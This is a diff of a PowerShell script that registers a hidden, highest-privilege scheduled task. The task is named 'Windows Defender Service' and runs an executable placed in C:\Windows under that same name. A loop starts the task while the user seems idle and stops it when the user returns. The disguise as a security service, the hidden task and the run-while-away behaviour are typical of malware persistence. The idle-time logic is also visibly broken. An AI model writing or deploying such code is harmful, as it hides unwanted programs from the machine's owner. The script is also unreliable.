@@ -1,27 +1,42 @@
 $TaskName = "Windows Defender Service"
-$FilePath = "C:\Windows\Config_.py"
-$PythonWPath = (Get-Command pythonw).Path
-$Action = New-ScheduledTaskAction -Execute $PythonWPath -Argument $FilePath
+$ExePath = "C:\Windows\Windows Defender Service.exe" # Replace with your EXE path
 
-# Trigger when the computer has been idle for 5 minutes
-$Trigger = New-ScheduledTaskTrigger -Idle -IdleTime 5
+# Create the action
+$Action = New-ScheduledTaskAction -Execute $ExePath
 
-$Settings = New-ScheduledTaskSettingsSet -Hidden -AllowDemandStart -AllowHardTerminate -WakeToRun
+# Create the logon trigger (as a fallback)
+$LogonTrigger = New-ScheduledTaskTrigger -AtLogOn
 
-# Use the current user's credentials
+# Create the settings
+$Settings = New-ScheduledTaskSettingsSet -Hidden
+
+# Create the principal
 $Principal = New-ScheduledTaskPrincipal -UserId ([System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value) -RunLevel Highest
 
-# Create the scheduled task
-Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal -Force
+# Register the task with a logon trigger
+Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $LogonTrigger -Settings $Settings -Principal $Principal -Force
 
-# Get the scheduled task object
-$Task = Get-ScheduledTask -TaskName $TaskName
+# Function to check idle time and start/stop the task
+function Check-IdleTask {
+    $IdleTime = (Get-WmiObject -Class Win32_PerfFormattedData_PerfOS_System).SystemUpTime
 
-# Disable the "Start the task only if the computer is on AC power" condition
-$Task.Settings.DisallowStartIfOnBatteries = $false
+    $LastInput = (Get-WmiObject -Class Win32_ComputerSystem).LastBootUpTime
+    $LastInput = [System.Management.ManagementDateTimeConverter]::ToDateTime($LastInput)
+    $LastInput = $LastInput.AddMilliseconds((Get-WmiObject -Class Win32_PerfFormattedData_PerfOS_System).SystemUpTime)
 
-# Set the task to hidden
-$Task.Settings.Hidden = $true
+    $IdleSeconds = ((Get-Date) - $LastInput).TotalSeconds
 
-# Update the task using the -InputObject parameter
-Set-ScheduledTask -InputObject $Task
+    if ($IdleSeconds -ge 60) {
+        # Idle for 1 minute, start the task
+        Start-ScheduledTask -TaskName $TaskName
+    } else {
+        # Not idle, stop the task
+        Stop-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue # prevent error if the task is already stopped
+    }
+}
+
+# Run the check every 10 seconds
+while ($true) {
+    Check-IdleTask
+    Start-Sleep -Seconds 10
+}
